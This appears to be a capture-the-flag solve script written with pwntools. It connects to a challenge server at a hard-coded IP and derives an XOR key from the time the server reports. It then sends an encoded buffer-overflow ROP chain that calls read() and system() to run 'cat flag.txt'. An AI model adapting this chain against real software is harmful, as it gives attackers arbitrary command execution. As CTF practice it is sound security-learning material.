from pwn import *
from datetime import datetime, timezone


HOST = "143.198.163.4"
PORT = 3000

elf = ELF("./whatsthetime", checksec=False)
READ_PLT = elf.plt["read"]
SYSTEM_PLT = elf.plt["system"]
BSS = elf.bss() + 0x100
OFFSET = 68


def encode(data: bytes, base: int) -> bytes:
    out = bytearray(data)
    key = base
    for i in range(0, len(out), 4):
        for j in range(4):
            if i + j < len(out):
                out[i + j] ^= (key >> (8 * j)) & 0xFF
        key += 1
    return bytes(out)


def build_stage1(base: int) -> bytes:
    rop = flat(
        b"A" * OFFSET,
        READ_PLT,
        SYSTEM_PLT,
        0,
        BSS,
        0x20,
        0xDEADBEEF,
        BSS,
    )
    return encode(rop, base)


def main():
    io = remote(HOST, PORT)
    io.recvuntil(b"Currently the time is: ")
    line = io.recvline().decode().strip()
    base = int(
        datetime.strptime(line, "%a %b %d %H:%M:%S %Y")
        .replace(tzinfo=timezone.utc)
        .timestamp()
    )

    io.send(build_stage1(base))
    io.recvn(40)
    io.send(b"cat flag.txt\x00")
    print(io.recvrepeat(2).decode(errors="ignore"))


if __name__ == "__main__":
    main()
